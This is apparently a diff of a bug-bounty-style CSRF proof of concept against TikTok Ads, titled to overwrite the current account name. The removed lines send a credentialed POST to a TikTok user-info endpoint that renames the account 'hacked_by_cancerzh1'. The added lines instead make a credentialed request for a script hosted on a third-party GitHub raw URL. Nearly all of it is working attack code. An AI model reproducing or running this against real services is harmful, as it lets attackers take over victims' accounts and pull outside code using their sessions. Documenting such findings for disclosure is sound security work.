@@ -6,13 +6,13 @@ function getMe(){
 // retrieve page content
 var xhr = new XMLHttpRequest();
 // now execute the CSRF attack
-xhr.open("POST",
-"https://ads.tiktok.com/web/user/update/user_info", true);
+xhr.open("GET",
+"https://raw.githubusercontent.com/cancerz1990/h1/main/login.js", true);
 xhr.withCredentials="true";
 
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.setRequestHeader("Content-Type", "application/json");
 
-xhr.send('aid=1583&name=hacked_by_cancerzh1');
+xhr.send('');
 }
 </script><center>
 <h1>CSRF To Overwrite Current tiktok ads name</h1>
